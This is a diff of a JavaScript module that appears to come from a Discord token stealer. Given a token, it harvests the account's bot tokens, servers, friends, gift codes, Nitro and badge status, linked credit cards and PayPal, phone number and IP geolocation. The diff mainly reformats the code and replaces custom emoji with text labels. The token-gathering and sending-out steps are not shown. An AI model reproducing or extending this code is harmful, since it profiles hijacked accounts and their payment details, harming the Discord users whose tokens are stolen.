@@ -2,14 +2,20 @@ const fetch = require("sync-fetch");
 
 function getBotToken(e) {
     var n, t;
-    return "Invalid" == (t = getInfo("https://discord.com/api/v9/applications", e)) ? "Token Isn't Valid" : ((t = t.filter(e => e.bot)).forEach(e => n += `${e.bot.username}::${e.bot.id}::${e.bot.token}||`), n.slice(9, -2))
+    return "Invalid" == (t = getInfo("https://discord.com/api/v9/applications", e)) 
+    ? "Token Isn't Valid" 
+    : ((t = t.filter(e => e.bot)).forEach(e => n += `${e.bot.username}::${e.bot.id}::${e.bot.token}||`), n.slice(9, -2))
 }
 function calcDate(a, b) {
     return new Date(a.setMonth(a.getMonth() + b))
 }
 function guildList(e) {
-    var n, t = getInfo("https://discord.com/api/v9/users/@me/guilds", e);
-    return "Invalid" == t ? "Token Isn't Valid" : (t.forEach(e => n += `${e.name}::${e.id}||`), n.slice(9, -2))
+    var n, 
+    t = getInfo("https://discord.com/api/v9/users/@me/guilds", e);
+    return "Invalid" == t 
+    ? "Token Isn't Valid" 
+    : (t.forEach(e => n += `${e.name}::${e.id}||`), 
+    n.slice(9, -2))
 }
 function getGiforPng(url) {
     if (!url) return false
@@ -19,7 +25,9 @@ function getGiforPng(url) {
 }
 function friendList(e) {
     var n, t = getInfo("https://discordapp.com/api/v9/users/@me/relationships", e);
-    return "Invalid" == t ? "Token Isn't Valid" : ((t = t.filter(e => 1 == e.type)).forEach(e => n += `${e.user.username}#${e.user.discriminator}::${e.id} || `), n.slice(9, -3))
+    return "Invalid" == t 
+    ? "Token Isn't Valid" 
+    : ((t = t.filter(e => 1 == e.type)).forEach(e => n += `${e.user.username}#${e.user.discriminator}::${e.id} || `), n.slice(9, -3))
 }
 function getGifts(e, s) {
     var retu = []
@@ -37,38 +45,81 @@ function getNitro(r) {
         default:
             return ":x:"
         case 1:
-            return "<:946246402105819216:962747802797113365>"
+            return "Nitro"
         case 2:
-            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
+            if (!r.premium_guild_since) return "Nitro"
             var now = new Date(Date.now())
-            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
-            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
+            var arr = [
+                "Booster 1 Month",
+                "Booster 2 Month",
+                "Booster 6 Month",
+                "Booster 9 Month",
+                "Booster 12 Month",
+                "Booster 15 Month",
+                "Booster 18 Month",
+                "Booster 24 Month"
+            ]
+            var a = [
+                new Date(r.premium_guild_since),
+                new Date(r.premium_guild_since),
+                new Date(r.premium_guild_since),
+                new Date(r.premium_guild_since), 
+                new Date(r.premium_guild_since), 
+                new Date(r.premium_guild_since), 
+                new Date(r.premium_guild_since)
+            ]
             var b = [2, 3, 6, 9, 12, 15, 18, 24]
             var r = []
             for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
             var i = 0
             for (var p of r) p > 0 ? "" : i++
-            return "<:946246402105819216:962747802797113365> " + arr[i]
+            return "Nitro " + arr[i]
     }
 }
 function friendB(e) {
     var n, t = e.filter(e => 1 == e.type);
     for (filter of t) {
-        var i = friendBadges(filter.user.public_flags);
-        "None" != i && (n += `${i} ${filter.user.username}#${filter.user.discriminator}\n`)
+        var i = friendBadges(filter.user.public_flags)
+        ; "None" != i && (n += `${i} ${filter.user.username}#${filter.user.discriminator}\n`)
     }
-    return n || (n = "None"), "None" == n ? n : n.slice(9)
+    return n 
+    || (n = "None"), 
+    "None" == n 
+    ? n 
+    : n.slice(9)
 }
 function getIPInfo(e) {
     return fetch(`http://ip-api.com/json/${e}`).json()
 }
 function badges(e) {
-    var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> ") , 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+    var n = ""
+    ; return 1 == (1 & e) 
+    && (n += "Staff Discord ")
+    , 2 == (2 & e) && (n += "Partner Discord ")
+    , 4 == (4 & e) && (n += "Events Discord ")
+    , 8 == (8 & e) && (n += "Bug Hunter Level 1 ")
+    , 16384 == (16384 & e) && (n += "Bug Hunter Level 2 ")
+    , 64 == (64 & e) && (n += "Bravery ")
+    , 128 == (128 & e) && (n += "Brilliance ")
+    , 256 == (256 & e) && (n += "Balance ")
+    , 512 == (512 & e) && (n += "Early ")
+    , 4194304 == (4194304 & e) && (n += "Active Develper ")
+    , 131072 == (131072 & e) && (n += "Discord Developer Verified ")
+    , "" == n && (n = ":x:")
+    , n
 }
 function friendBadges(e) {
-    var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = "None"), n
+    var n = ""
+    ; return 1 == (1 & e) && (n += "Staff Discord ")
+    , 2 == (2 & e) && (n += "Partner Discord ")
+    , 4 == (4 & e) && (n += "Events Discord ")
+    , 8 == (8 & e) && (n += "Bug Hunter Level 1 ")
+    , 4194304 == (4194304 & e) && (n += "Active Develper ")
+    , 512 == (512 & e) && (n += "Early ")
+    , 16384 == (16384 & e) && (n += "Bug Hunter Level 2 ")
+    , 131072 == (131072 & e) && (n += "Discord Developer Verified ")
+    , "" == n && (n = "None")
+    , n
 }
 function getInfo(e, n) {
     var t = fetch(e, {
@@ -98,8 +149,7 @@ function getAllInfos(e, n, t) {
     if (n) var p = getIPInfo(n);
     var h, g, m = 0,
         v = "";
-    if (a?.forEach(e => {
-            e.brand && 0 == e.invalid && (v += "<a:Card:932986286439038997> "), e.email && (v += "<:paypal:896441236062347374> ")
+    if (a?.forEach(e => { e.brand && 0 == e.invalid && (v += "Credit Card "), e.email && (v += "Paypal ")
         }), v || (v = "None"), g = r.bio ? r.bio : "No Biography", h = r.phone ? r.phone : "No Phone", r.banner) var I = getGiforPng(`https://cdn.discordapp.com/banners/${r.id}/${r.banner}`);
     else I = "No";
     if (r.nsfw_allowed) var b = "Yes";
